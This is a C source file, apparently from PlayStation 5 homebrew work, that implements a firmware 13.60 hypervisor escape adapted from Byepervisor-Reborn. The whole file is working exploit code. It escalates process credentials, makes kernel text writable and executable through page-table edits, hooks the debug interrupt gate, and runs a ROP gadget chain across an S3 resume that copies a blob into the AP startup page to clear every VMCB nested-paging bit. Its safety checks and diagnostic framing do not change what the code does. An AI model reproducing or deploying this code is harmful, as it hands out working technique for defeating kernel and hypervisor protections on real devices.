/*
 * Firmware 13.60 escape diagnostic, adapted from Byepervisor-Reborn.
 *
 * This is NOT a Linux loader. The previous implementation passed a 13.20-only
 * takeover blob an incomplete register contract. Until the missing 13.60
 * takeover addresses are verified, do one S3 escape and return to ProsperoOS.
 * Never load Linux images or write the 4-GiB Linux cave on this diagnostic path.
 */
#include "hv_defeat_1360.h"
#include "resume_status.h"
#include "utils.h"
#include "byepervisor/kdlsym.h"
#include "byepervisor/khook.h"
#include "byepervisor/paging.h"
#include <ps5/kernel.h>
#include <stdint.h>
#include <unistd.h>

int sceKernelSleep(int secs);
int sceKernelGetMainSocId(void);
extern unsigned char break_hv_bin[];
extern unsigned int break_hv_bin_len;

#define HOOK_CORE 0
#define HOOK_IST 6
#define TSS_STRIDE 0x68
#define STARTUP_MP_PAYLOAD_PAGE 0x3FFFF000ULL
#define CAVE_STATE_OFF 0x600
#define STATE_ARMED 0x4B484F4F4B454401ULL
#define PRO_SOC_ID 0x840fd0
#define RESUME_POLLS 120

static khook_t resume_hook;
static uint64_t oracle;
static int armed;

static int by_read(uint64_t addr, void *dst, size_t len) {
  kread(addr, dst, len);
  return 0;
}

static int by_write(uint64_t addr, const void *src, size_t len) {
  kwrite(addr, (void *)src, len);
  return 0;
}

static int restore_resume_hook(void) {
  if (!armed)
    return 0;
  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);
  int disarmed = kh_disarm(&resume_hook);
  if (disarmed) {
    notify("13.60: could not disarm resume hook (%d); cold restart required.\n",
           disarmed);
    return -1;
  }
  uint64_t gate = resume_hook.idt_base +
                  (uint64_t)HOOK_CORE * 0x1000 + 16 * KH_VEC_DB;
  uint64_t ist = resume_hook.tss_base +
                 (uint64_t)HOOK_CORE * TSS_STRIDE + KH_TSS_IST(HOOK_IST);
  if (kh_restore(&resume_hook) ||
      kread64(gate) != resume_hook.saved_gate_lo ||
      kread64(gate + 8) != resume_hook.saved_gate_hi ||
      kread64(ist) != resume_hook.saved_ist) {
    notify("13.60: hook restore readback failed; cold restart required.\n");
    return -1;
  }
  kwrite64(resume_hook.scratch_base + CAVE_STATE_OFF, 0);
  armed = 0;
  notify("13.60: original debug gate and IST restored.\n");
  return 0;
}

/* Same permission changes as Byepervisor-Reborn; nothing is persisted in flash. */
static void prepare_permissions(uint64_t pmap) {
  uint64_t addr, entry;
  for (uint64_t va = ktext; va < kdata; va += 0x1000) {
    addr = find_pde(pmap, va, &entry);
    if (addr != UINT64_MAX) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(addr, entry);
    }
    addr = find_pte(pmap, va, &entry);
    if (addr != UINT64_MAX) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(addr, entry);
    }
  }

  uint64_t va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  addr = find_pml4e(pmap, va, &entry);
  if (addr != UINT64_MAX) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(addr, entry);
  }
  addr = find_pdpe(pmap, va, &entry);
  if (addr == UINT64_MAX)
    return;
  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
  kwrite64(addr, entry);
  if (PDE_FIELD(entry, PS))
    return;
  addr = find_pde(pmap, va, &entry);
  if (addr == UINT64_MAX)
    return;
  CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
  kwrite64(addr, entry);
  if (PDE_FIELD(entry, PS))
    return;
  addr = find_pte(pmap, va, &entry);
  if (addr != UINT64_MAX) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(addr, entry);
  }
}

int hv_defeat_1360(void) {
  if (fw != 0x1360) {
    notify("13.60 diagnostic: wrong firmware; refusing to arm.\n");
    return -1;
  }
  int soc = sceKernelGetMainSocId();
  notify("13.60 diagnostic: SoC=%#x, non-Pro consoles only.\n", soc);
  if (soc == PRO_SOC_ID) {
    notify("13.60 diagnostic: Pro is not supported by this build.\n");
    return -1;
  }
  if (break_hv_bin_len == 0 || break_hv_bin_len > 0xF00) {
    notify("13.60 diagnostic: AP blob does not fit its reserved page.\n");
    return -1;
  }

  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  uint64_t kernel_cr3 = kread64(pmap + 0x28);
  uint64_t hv_base = env_offset.HV_LOADER_PA_REGULAR;
  if (!kernel_cr3 || (kernel_cr3 & 0xFFF) || !hv_base ||
      !env_offset.HV_SYM_HEAP_BASE || !env_offset.HV_SYM_PCPUS) {
    notify("13.60 diagnostic: invalid CR3/HV parameters; refusing to arm.\n");
    return -1;
  }
  if (kread64(scratch + CAVE_STATE_OFF) == STATE_ARMED) {
    notify("13.60 diagnostic: an earlier hook is still marked armed.\n"
           "Cold restart and run a clean elfldr session; do not stack payloads.\n");
    return -1;
  }

  kernel_set_ucred_authid(getpid(), 0x4800000000000007);
  pin_to_core(HOOK_CORE);
  prepare_permissions(pmap);
  oracle = scratch + KH_OFF_USER;
  kwrite64(oracle, 0);
  kwrite64(oracle + 0x10, 0);
  kwrite(scratch + 0x1000, break_hv_bin, break_hv_bin_len);

  int ret = kh_init(&resume_hook, by_read, by_write, ktext, scratch, HOOK_IST);
  if (ret)
    return ret;
  resume_hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&resume_hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&resume_hook, HOOK_CORE);
  resume_hook.oneshot = 1;
  kh_set_hook_target(&resume_hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
  kh_set_resume_rsi(&resume_hook, kdldmap(STARTUP_MP_PAYLOAD_PAGE));
  kh_set_resume_rdx(&resume_hook, kernel_cr3);

  uint8_t chain_buf[0x800];
  kh_chain_t chain;
  kh_chain_init(&chain, chain_buf, sizeof(chain_buf));
  kh_chain_store(&chain, oracle, PL5_COOKIE_HOOK_FIRED);
  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, kernel_cr3);
  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);
  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), scratch + 0x1000, 0xF00);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00),
                 kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), hv_base);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20),
                 hv_base + env_offset.HV_SYM_HEAP_BASE);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28),
                 hv_base + env_offset.HV_SYM_PCPUS);
  if (chain.err) {
    notify("13.60 diagnostic: chain overflow; refusing to install.\n");
    return -1;
  }
  ret = kh_install(&resume_hook, &chain);
  if (ret)
    return ret;
  armed = 1;
  kwrite64(scratch + CAVE_STATE_OFF, STATE_ARMED);
  kh_trigger(&resume_hook);
  notify("13.60 diagnostic: escape armed; no Linux files loaded or staged.\n");
  return 0;
}

int hv_defeat_1360_post_resume(void) {
  if (!armed)
    return -1;
  notify("13.60 diagnostic: waiting for one S3 round-trip.\n"
         "Wake only after the orange light is steady. No automatic retries.\n");
  uint64_t last = UINT64_MAX;
  int success = 0;
  for (int poll = 0; poll < RESUME_POLLS; poll++) {
    pin_to_core(HOOK_CORE);
    uint64_t state = kread64(oracle);
    if (state != last) {
      log_reopen();
      notify("13.60 diagnostic: resume state=%#lx mask=%#lx\n",
             (unsigned long)state, (unsigned long)kread64(oracle + 0x10));
      last = state;
    }
    if (state == PL5_COOKIE_HV_COMPLETE) {
      success = (kread64(oracle + 0x10) == PL5_EXPECTED_CORE_MASK);
      break;
    }
    if (state == PL5_COOKIE_HV_INCOMPLETE)
      break;
    sceKernelSleep(1);
  }
  int restored = restore_resume_hook();
  if (!success || restored) {
    notify("13.60 diagnostic: FAIL (cookie=%#lx). Save plinux5.log, then cold restart.\n",
           (unsigned long)last);
    return -1;
  }
  notify("13.60 diagnostic: PASS - all 16 VMCB NP_ENABLE bits cleared and read back.\n"
         "Linux was NOT launched. Save plinux5.log; the next step is a firmware-correct takeover.\n");
  return 0;
}
